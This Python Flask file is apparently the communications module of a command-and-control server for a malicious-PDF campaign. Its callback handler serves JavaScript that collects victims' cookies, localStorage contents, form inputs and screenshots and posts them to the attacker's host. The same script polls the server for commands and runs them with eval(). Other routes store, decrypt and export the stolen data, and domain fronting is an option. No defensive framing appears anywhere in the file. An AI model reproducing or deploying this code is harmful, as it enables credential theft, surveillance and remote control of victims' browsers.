import threading
import time
import redis
from flask_limiter.util import get_remote_address
import psutil
import datetime
import json
import logging
from flask import Flask, render_template, request, jsonify, Response
from flask_socketio import SocketIO, emit
from core.session_manager import SessionManager
from core.database_manager import DatabaseManager
from core.config_manager import ConfigManager
from core.port_manager import PortManager
from core.auth_manager import AuthManager
from core.validation_manager import ValidationManager
from core.secure_comms import SecureCommunications
from core.rate_limiter import RateLimiter
from core.error_handler import ErrorHandler
from core.encryption_manager import EncryptionManager

app = Flask(__name__)
app.config['SECRET_KEY'] = 'SECRET_KEY_HERE'
socketio = SocketIO(app)

class CommsManager:
    def __init__(self, config_manager: ConfigManager, session_manager: SessionManager, exfil_engine):
        self.config = config_manager
        self.session_manager = session_manager
        self.exfil_engine = exfil_engine
        self.encryption_manager = EncryptionManager(config_manager)
        self.comms_manager = self
        self.running = False
        self.server_thread = None
        self.http_thread = None
        self.shutdown_event = threading.Event()
        self.logger = logging.getLogger(__name__)
    
    # Initialize new managers
        self.port_manager = PortManager(config_manager)
        self.auth_manager = AuthManager(config_manager)
        self.validation_manager = ValidationManager(config_manager)
        self.secure_comms = SecureCommunications(config_manager)
    
    # Initialize Flask app and SocketIO
        self.app = Flask(__name__)
        self.app.config['SECRET_KEY'] = self.config.get('c2.secret_key', 'default-secret-key')
        self.socketio = SocketIO(self.app, cors_allowed_origins="*")
    
    # Initialize rate limiter
        try:
            # Try to use Redis for rate limiting if available
            storage_uri = self.config.get('rate_limiting.storage_uri', 'redis://localhost:6379')
            self.rate_limiter = RateLimiter(self.app, config_manager, storage_uri=storage_uri)
        except Exception:
        # Fallback to in-memory storage
            self.rate_limiter = RateLimiter(self.app, config_manager)
    
        self.error_handler = ErrorHandler(config_manager)
    
    # Initialize domain fronting if enabled
        if self.config.get('c2.domain_fronting.enabled', False):
            from core.domain_fronting import DomainFronting
            self.domain_fronting = DomainFronting(self.config)
        else:
            self.domain_fronting = None
    
    # Register routes with authentication and validation
        self._register_routes()
    
    # SocketIO events
        self.socketio.on('client_event')(self.handle_client_event)

    def _register_routes(self):
        """Register all Flask routes"""
        self.app.route('/')(self.index)
        self.app.route('/api/command', methods=['POST'])(self.auth_manager.require_auth(self.receive_command))
        self.app.route('/api/sessions')(self.auth_manager.require_auth(self.list_sessions))
        self.app.route('/api/data/<session_id>')(self.auth_manager.require_auth(self.get_session_data))
        self.app.route('/api/callback')(self.handle_pdf_callback)
        self.app.route('/api/data', methods=['POST'])(self.rate_limiter.apply_limits(self.receive_client_data, "10 per minute"))
        self.app.route('/api/commands/<session_id>')(self.get_commands_for_client)
        self.app.route('/api/screenshot', methods=['POST'])(self.rate_limiter.apply_limits(self.receive_screenshot, "5 per minute"))
        self.app.route('/api/forms', methods=['POST'])(self.rate_limiter.apply_limits(self.receive_form_data, "10 per minute"))

    def index(self):
        return render_template('dashboard.html')

    def list_sessions(self):
        try:
            sessions = self.session_manager.get_active_sessions()
            return jsonify(sessions)
        except Exception as e:
            self.error_handler.handle_request_error(e, "list_sessions")
            return jsonify({'error': 'Internal server error'}), 500

    def get_session_data(self, session_id):
        try:
            # Validate session_id
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return jsonify({'error': error_msg}), 400
                
            data = self.session_manager.get_session(session_id)
            if not data:
                return jsonify({'error': 'Session not found'}), 404
                
            return jsonify(data)
        except Exception as e:
            self.error_handler.handle_request_error(e, "get_session_data")
            return jsonify({'error': 'Internal server error'}), 500

    def receive_command(self):
        try:
            data = request.json
            
            # Validate required fields
            if not data or 'session_id' not in data or 'command' not in data:
                return jsonify({'error': 'Missing required fields'}), 400
                
            # Validate session_id
            is_valid, error_msg = self.validation_manager.validate_session_id(data['session_id'])
            if not is_valid:
                return jsonify({'error': error_msg}), 400
                
            # Validate command
            if not data['command'] or len(data['command']) > 1000:
                return jsonify({'error': 'Invalid command'}), 400
                
            self.session_manager.add_command(data['session_id'], data['command'], data.get('args'))
            return jsonify({'status': 'ok'})
        except Exception as e:
            self.error_handler.handle_request_error(e, "receive_command")
            return jsonify({'error': 'Internal server error'}), 500

    def handle_client_event(self):
        # Real-time stream handling
        pass
   
    def handle_pdf_callback(self):
        """Handle callback from malicious PDF"""
        try:
        # Get client information
            user_agent = request.headers.get('User-Agent', 'unknown')
            ip_address = request.remote_addr
       
        # Create a new session for this PDF victim
            session_id = self.session_manager.create_session(ip_address, user_agent)
       
        # Return additional JavaScript to execute on the client
            c2_host = self.config.get('c2.host', '0.0.0.0')
            c2_port = self.port_manager.get_valid_port()
        
            response_script = f"""
            // Send additional data back to C2
        function sendSystemInfo() {{
            var info = {{
                session_id: "{session_id}",
                platform: navigator.platform,
                language: navigator.language,
                screen_resolution: screen.width + "x" + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: document.cookie,
                local_storage: {{}}
            }};
       
            // Collect localStorage data
            try {{
                for (var i = 0; i < localStorage.length; i++) {{
                    var key = localStorage.key(i);
                    info.local_storage[key] = localStorage.getItem(key);
                }}
            }} catch(e) {{
                console.log("Error accessing localStorage: " + e.message);
            }}
       
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "http://{c2_host}:{c2_port}/api/data", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(info));
        }}
   
        // Function to capture screenshots
        function captureScreen() {{
            if (typeof html2canvas !== 'undefined') {{
                html2canvas(document.body).then(function(canvas) {{
                    var imageData = canvas.toDataURL("image/png");
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "http://{c2_host}:{c2_port}/api/screenshot", true);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.send(JSON.stringify({{
                        session_id: "{session_id}",
                        image: imageData
                    }}));
                }});
            }}
        }}
   
        // Function to execute commands from C2
        function checkForCommands() {{
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "http://{c2_host}:{c2_port}/api/commands/{session_id}", true);
            xhr.onreadystatechange = function() {{
                if (xhr.readyState == 4 && xhr.status == 200) {{
                    try {{
                        var commands = JSON.parse(xhr.responseText);
                        if (commands && commands.length > 0) {{
                            for (var i = 0; i < commands.length; i++) {{
                                eval(commands[i].command);
                            }}
                        }}
                    }} catch(e) {{
                        console.log("Error executing commands: " + e.message);
                    }}
                }}
            }};
            xhr.send();
        }}
   
        // Function to exfiltrate form data
        function exfiltrateForms() {{
            var forms = document.querySelectorAll("form");
            var formData = [];
       
            for (var i = 0; i < forms.length; i++) {{
                var form = forms[i];
                var inputs = form.querySelectorAll("input, select, textarea");
                var data = {{}};
           
                for (var j = 0; j < inputs.length; j++) {{
                    var input = inputs[j];
                    if (input.name && input.value) {{
                        data[input.name] = input.value;
                    }}
                }}
           
                formData.push({{
                    action: form.action,
                    method: form.method,
                    data: data
                }});
            }}
       
            if (formData.length > 0) {{
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "http://{c2_host}:{c2_port}/api/forms", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify({{
                    session_id: "{session_id}",
                    forms: formData
                }}));
            }}
        }}
   
        // Execute immediately
        sendSystemInfo();
   
        // Continue sending data periodically
        setInterval(sendSystemInfo, 30000);
        setInterval(checkForCommands, 10000);
        setInterval(exfiltrateForms, 60000);
   
        // Take a screenshot every 5 minutes
        setInterval(captureScreen, 300000);
        """
       
            return response_script, 200, {'Content-Type': 'application/javascript'}
        except Exception as e:
            self.error_handler.handle_request_error(e, "handle_pdf_callback")
            return jsonify({'error': 'Internal server error'}), 500 
   
    def receive_client_data(self):
        """Receive data from the PDF exploit client"""
        try:
            data = request.json
            if not data:
                return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
                
            session_id = data.get('session_id')
           
            # Validate session_id
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return jsonify({'status': 'error', 'message': error_msg}), 400
           
            # Validate payload size
            is_valid, error_msg = self.validation_manager.validate_payload_size(data)
            if not is_valid:
                return jsonify({'status': 'error', 'message': error_msg}), 413
           
            # Store the received data with encryption
            # encrypted_payload = self.config.encryption_manager.encrypt_data(json.dumps(data))
            encrypted_payload = self.encryption_manager.encrypt_data(data)
            self.session_manager.db.insert_collected_data(
                session_id=session_id,
                data_type='system_info',
                payload=encrypted_payload,
                metadata={'timestamp': datetime.datetime.now().isoformat()}
            )
           
            return jsonify({'status': 'ok'})
        except Exception as e:
            self.error_handler.handle_request_error(e, "receive_client_data")
            return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

    def get_commands_for_client(self, session_id):
        """Get pending commands for a client"""
        try:
            # Validate session_id
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return jsonify({'error': error_msg}), 400
                
            # Get pending commands for this session
            commands = self.session_manager.get_pending_commands(session_id)
           
            # Mark commands as sent
            for cmd in commands:
                self.session_manager.update_command_status(cmd['id'], 'sent')
           
            return jsonify(commands)
        except Exception as e:
            self.error_handler.handle_request_error(e, "get_commands_for_client")
            return jsonify({'error': 'Internal server error'}), 500

    def receive_screenshot(self):
        """Receive screenshot from client"""
        try:
            data = request.json
            if not data:
                return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
                
            session_id = data.get('session_id')
            image_data = data.get('image')
           
            # Validate session_id
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return jsonify({'status': 'error', 'message': error_msg}), 400
               
            # Validate image data
            if not image_data or not image_data.startswith('data:image/'):
                return jsonify({'status': 'error', 'message': 'Invalid image data'}), 400
               
            # Validate payload size
            is_valid, error_msg = self.validation_manager.validate_payload_size(data)
            if not is_valid:
                return jsonify({'status': 'error', 'message': error_msg}), 413
               
            # Store the screenshot with encryption
            # encrypted_payload = self.config.encryption_manager.encrypt_data(image_data)
            encrypted_payload = self.encryption_manager.encrypt_data(image_data)
            self.session_manager.db.insert_collected_data(
                session_id=session_id,
                data_type='screenshot',
                payload=encrypted_payload,
                metadata={'timestamp': datetime.datetime.now().isoformat()}
            )
           
            return jsonify({'status': 'ok'})
        except Exception as e:
            self.error_handler.handle_request_error(e, "receive_screenshot")
            return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

    def receive_form_data(self):
        """Receive form data from client"""
        try:
            data = request.json
            if not data:
                return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
                
            session_id = data.get('session_id')
            forms = data.get('forms')
           
            # Validate session_id
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return jsonify({'status': 'error', 'message': error_msg}), 400
               
            # Validate forms data
            if not forms or not isinstance(forms, list):
                return jsonify({'status': 'error', 'message': 'Invalid forms data'}), 400
                
            # Validate payload size
            is_valid, error_msg = self.validation_manager.validate_payload_size(data)
            if not is_valid:
                return jsonify({'status': 'error', 'message': error_msg}), 413
               
            # Store the form data with encryption
            # encrypted_payload = self.config.encryption_manager.encrypt_data(json.dumps(forms))
            encrypted_payload = self.encryption_manager.encrypt_data(forms)
            self.session_manager.db.insert_collected_data(
                session_id=session_id,
                data_type='form_data',
                payload=encrypted_payload,
                metadata={'timestamp': datetime.datetime.now().isoformat()}
            )
           
            return jsonify({'status': 'ok'})
        except Exception as e:
            self.error_handler.handle_request_error(e, "receive_form_data")
            return jsonify({'status': 'error', 'message': 'Internal server error'}), 500


    def start(self):
        """Start the C2 communications server"""
        if self.running:
            self.logger.info("C2 server is already running")
            return
        
        self.running = True
        self.shutdown_event.clear()
        host = self.config.get('c2.host', '0.0.0.0')
        port = self.config.get('c2.port', 5001)
        
        self.logger.info(f"Starting C2 server on {host}:{port}")
        
        try:
            # Get SSL context
            ssl_context = self.secure_comms.get_ssl_context()
            
            # Start the secure server in a separate thread
            self.server_thread = threading.Thread(
                target=self._run_socketio_server,
                args=(self.app, host, port, ssl_context)
            )
            self.server_thread.daemon = True
            self.server_thread.start()
            self.logger.info(f"C2 server started successfully on {host}:{port}")
            
            # Start the C2 server (non-SSL) on a different port if configured
            http_port = self.config.get('c2.http_port')
            if http_port:
                # Create a new Flask app for the HTTP server
                http_app = Flask(__name__)
                http_app.config['SECRET_KEY'] = self.app.config['SECRET_KEY']
                http_socketio = SocketIO(http_app)
                
                # Copy routes from the main app to the HTTP app
                # This is a simplified approach - you might need to adjust based on your exact needs
                
                self.http_thread = threading.Thread(
                    target=self._run_socketio_server,
                    args=(http_app, host, http_port, None)
                )
                self.http_thread.daemon = True
                self.http_thread.start()
                self.logger.info(f"HTTP server started on {host}:{http_port}")
                
        except Exception as e:
            self.logger.error(f"Error starting C2 server: {str(e)}")
            self.running = False
            raise RuntimeError(f"Failed to start C2 server: {str(e)}")

    def _run_socketio_server(self, app, host, port, ssl_context):
        """Run a SocketIO server with shutdown handling"""
        try:
            socketio_instance = SocketIO(app)
            if ssl_context:
                socketio_instance.run(app, host=host, port=port, ssl_context=ssl_context, debug=False)
            else:
                socketio_instance.run(app, host=host, port=port, debug=False)
        except Exception as e:
            self.logger.error(f"Server error: {str(e)}")

    def stop(self):
        """Stop the C2 servers without accessing request context"""
        if not self.running:
            return  # Already stopped, make it idempotent
        
        self.running = False
        
        # Signal threads to stop
        self.shutdown_event.set()
        
        # Wait for threads to finish (with timeout)
        if self.server_thread and self.server_thread.is_alive():
            self.server_thread.join(timeout=2.0)
        
        if self.http_thread and self.http_thread.is_alive():
            self.http_thread.join(timeout=2.0)

    def health_check(self):
        """Perform a health check of the C2 server"""
        try:
            # Check database connection
            db_status = self.session_manager.db.check_connection()
            
            # Check port availability
            port = self.port_manager.get_valid_port()
            port_status = self.port_manager._is_port_available(port)
            
            # Check SSL certificate
            cert_status = self.secure_comms._check_ssl_certificates()
            
            return {
                'server_status': 'running' if self.running else 'stopped',
                'database_status': 'connected' if db_status else 'disconnected',
                'port_status': 'available' if port_status else 'in_use',
                'ssl_status': 'valid' if cert_status else 'invalid',
                'timestamp': datetime.datetime.now().isoformat()
            }
        except Exception as e:
            self.error_handler.handle_request_error(e, "health_check")
            return {
                'server_status': 'error',
                'error': str(e),
                'timestamp': datetime.datetime.now().isoformat()
            }

    def update_config(self, new_config):
        """Update server configuration"""
        try:
            # Validate new configuration
            if not isinstance(new_config, dict):
                return {'status': 'error', 'message': 'Invalid configuration format'}
                
            # Update configuration in config manager
            for key, value in new_config.items():
                self.config.set(key, value)
                
            # Save configuration
            self.config.save()
            
            # Log configuration update
            logging.info(f"Configuration updated: {json.dumps(new_config)}")
            
            return {'status': 'success', 'message': 'Configuration updated successfully'}
        except Exception as e:
            self.error_handler.handle_request_error(e, "update_config")
            return {'status': 'error', 'message': f'Failed to update configuration: {str(e)}'}

    def get_server_stats(self):
        """Get server statistics"""
        try:
            # Get session statistics
            active_sessions = self.session_manager.get_active_sessions()
            total_sessions = self.session_manager.get_total_sessions()
            
            # Get data statistics
            data_stats = self.session_manager.db.get_data_stats()
            
            # Get system resource usage
            import psutil
            cpu_usage = psutil.cpu_percent()
            memory_usage = psutil.virtual_memory().percent
            disk_usage = psutil.disk_usage('/').percent
            
            return {
                'server_stats': {
                    'uptime': datetime.datetime.now().isoformat(),
                    'active_sessions': len(active_sessions),
                    'total_sessions': total_sessions,
                    'cpu_usage': f"{cpu_usage}%",
                    'memory_usage': f"{memory_usage}%",
                    'disk_usage': f"{disk_usage}%"
                },
                'data_stats': data_stats,
                'timestamp': datetime.datetime.now().isoformat()
            }
        except Exception as e:
            self.error_handler.handle_request_error(e, "get_server_stats")
            return {
                'error': str(e),
                'timestamp': datetime.datetime.now().isoformat()
            }

    def cleanup_expired_sessions(self):
        """Clean up expired sessions"""
        try:
            # Get expired sessions
            expired_sessions = self.session_manager.get_expired_sessions()
            
            # Clean up each expired session
            for session in expired_sessions:
                session_id = session['session_id']
                
                # Remove session from database
                self.session_manager.remove_session(session_id)
                
                # Log session cleanup
                logging.info(f"Cleaned up expired session: {session_id}")
                
            return {
                'status': 'success',
                'cleaned_sessions': len(expired_sessions),
                'timestamp': datetime.datetime.now().isoformat()
            }
        except Exception as e:
            self.error_handler.handle_request_error(e, "cleanup_expired_sessions")
            return {
                'status': 'error',
                'message': f'Failed to cleanup expired sessions: {str(e)}',
                'timestamp': datetime.datetime.now().isoformat()
            }

    def export_data(self, session_id, data_type=None, format='json'):
        """Export collected data for a session"""
        try:
            # Validate session_id
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return {'error': error_msg}, 400
                
            # Get data for the session
            if data_type:
                data = self.session_manager.db.get_data_by_type(session_id, data_type)
            else:
                data = self.session_manager.db.get_all_session_data(session_id)
                
            # Decrypt data
            decrypted_data = []
            for item in data:
                try:
                    # decrypted_payload = self.config.encryption_manager.decrypt_data(item['payload'])
                    decrypted_payload = self.encryption_manager.decrypt_data(item['payload'])
                    item['payload'] = decrypted_payload
                    decrypted_data.append(item)
                except Exception as e:
                    logging.error(f"Failed to decrypt data item {item['id']}: {str(e)}")
                    continue
                    
            # Format data for export
            if format == 'json':
                response = Response(
                    json.dumps(decrypted_data, indent=2),
                    mimetype='application/json',
                    headers={'Content-Disposition': f'attachment; filename=session_{session_id}_data.json'}
                )
            elif format == 'csv':
                # Convert to CSV format
                import csv
                import io
                
                output = io.StringIO()
                if decrypted_data:
                    fieldnames = ['id', 'session_id', 'data_type', 'payload', 'timestamp', 'metadata']
                    writer = csv.DictWriter(output, fieldnames=fieldnames)
                    writer.writeheader()
                    for item in decrypted_data:
                        writer.writerow(item)
                        
                response = Response(
                    output.getvalue(),
                    mimetype='text/csv',
                    headers={'Content-Disposition': f'attachment; filename=session_{session_id}_data.csv'}
                )
            else:
                return {'error': 'Unsupported export format'}, 400
                
            return response
        except Exception as e:
            self.error_handler.handle_request_error(e, "export_data")
            return {'error': f'Failed to export data: {str(e)}'}, 500

    def purge_data(self, session_id=None, data_type=None, older_than=None):
        """Purge collected data"""
        try:
            # Validate parameters
            if session_id:
                is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
                if not is_valid:
                    return {'error': error_msg}, 400
                    
            # Purge data
            purged_count = self.session_manager.db.purge_data(
                session_id=session_id,
                data_type=data_type,
                older_than=older_than
            )
            
            # Log data purge
            logging.info(f"Purged {purged_count} data records")
            
            return {
                'status': 'success',
                'purged_count': purged_count,
                'timestamp': datetime.datetime.now().isoformat()
            }
        except Exception as e:
            self.error_handler.handle_request_error(e, "purge_data")
            return {
                'status': 'error',
                'message': f'Failed to purge data: {str(e)}',
                'timestamp': datetime.datetime.now().isoformat()
            }
